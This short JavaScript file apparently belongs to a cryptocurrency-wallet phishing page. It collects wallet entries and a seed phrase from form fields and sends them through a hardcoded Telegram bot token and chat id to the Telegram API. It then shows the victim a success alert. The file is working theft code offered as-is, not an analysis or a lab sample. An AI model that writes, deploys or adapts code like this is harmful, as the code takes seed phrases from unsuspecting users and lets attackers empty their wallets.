//bot token
var telegram_bot_id = "7165516047:AAEaHWfQ87MvRUGtNJihrqoteBbE8JLkjwc";
//chat id
var chat_id = 731784706;

var wallet1, wallet2, wallet3, phrase, message;

var ready = function () {
    wallet1 = document.getElementById("wallet1").value;
    wallet2 = document.getElementById("wallet2").value;
    wallet3 = document.getElementById("wallet3").value;
    phrase = document.getElementById("phraseinput").value;

    message = "New Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
};

var sender = function () {
  ready();
  var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
      "method": "POST",
      "headers": {
          "Content-Type": "application/json",
          "cache-control": "no-cache"
      },
      "data": JSON.stringify({
          "chat_id": chat_id,
          "text": message
      })
  };
  $.ajax(settings)
  .then(function (response) {
        console.log(response);
        swal("Secussful", "You clicked the button!", "success");
    })
    .catch(function(error) {
        swal("Error", "You clicked the button!", "error");
        throw error;
    });
};
